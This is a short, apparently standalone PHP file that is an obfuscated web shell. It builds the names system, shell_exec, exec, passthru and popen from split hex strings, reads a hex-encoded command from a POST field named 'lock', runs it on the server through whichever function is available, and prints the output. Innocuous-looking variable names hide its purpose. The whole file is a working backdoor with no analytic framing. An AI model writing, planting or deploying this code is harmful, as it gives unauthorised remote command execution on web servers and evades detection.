<?php

$fld1 = '7';
$fld2 = '3';
$fld3 = '6';
$fld4 = 'c';
$fld5 = '8';
$fld6 = '5';
$fld7 = '0';
$fld8 = '1';
$fld9 = '2';
$fld10 = 'e';
$fld11 = '4';
$fld12 = 'd';
$fld13 = 'f';
$fld14 = 'b';
$uconvert1 = pack("H*", $fld1 . '3' . '7' . '9' . '7' . $fld2 . $fld1 . '4' . '6' . '5' . $fld3 . 'd');
$uconvert2 = pack("H*", $fld1 . '3' . $fld3 . '8' . $fld3 . '5' . $fld3 . $fld4 . '6' . 'c' . '5' . 'f' . $fld3 . '5' . '7' . $fld5 . '6' . $fld6 . '6' . '3');
$uconvert3 = pack("H*", $fld3 . '5' . $fld1 . $fld5 . '6' . $fld6 . '6' . $fld2);
$uconvert4 = pack("H*", $fld1 . $fld7 . '6' . $fld8 . $fld1 . '3' . '7' . $fld2 . '7' . '4' . $fld3 . $fld5 . '7' . $fld9 . $fld1 . '5');
$uconvert5 = pack("H*", $fld1 . $fld7 . '6' . 'f' . $fld1 . '0' . '6' . $fld6 . $fld3 . $fld10);
$uconvert6 = pack("H*", $fld1 . $fld2 . $fld1 . $fld11 . $fld1 . $fld9 . $fld3 . '5' . '6' . $fld8 . '6' . $fld12 . '5' . $fld13 . $fld3 . '7' . '6' . $fld6 . $fld1 . '4' . $fld6 . 'f' . $fld3 . $fld2 . '6' . 'f' . '6' . 'e' . '7' . '4' . '6' . '5' . $fld3 . $fld10 . $fld1 . '4' . $fld1 . $fld2);
$uconvert7 = pack("H*", $fld1 . '0' . $fld3 . '3' . '6' . $fld4 . '6' . $fld13 . '7' . $fld2 . '6' . $fld6);
$lock = pack("H*", $fld3 . 'c' . $fld3 . $fld13 . '6' . $fld2 . $fld3 . $fld14);
if (isset($_POST[$lock])) {
    $lock = pack("H*", $_POST[$lock]);
    if (function_exists($uconvert1)) {
        $uconvert1($lock);
    } elseif (function_exists($uconvert2)) {
        print $uconvert2($lock);
    } elseif (function_exists($uconvert3)) {
        $uconvert3($lock, $storage_variable);
        print join("\n", $storage_variable);
    } elseif (function_exists($uconvert4)) {
        $uconvert4($lock);
    } elseif (function_exists($uconvert5) && function_exists($uconvert6) && function_exists($uconvert7)) {
        $arg_st = $uconvert5($lock, 'r');
        if ($arg_st) {
            $attribute_const = $uconvert6($arg_st);
            $uconvert7($arg_st);
            print $attribute_const;
        }
    }
    exit;
}
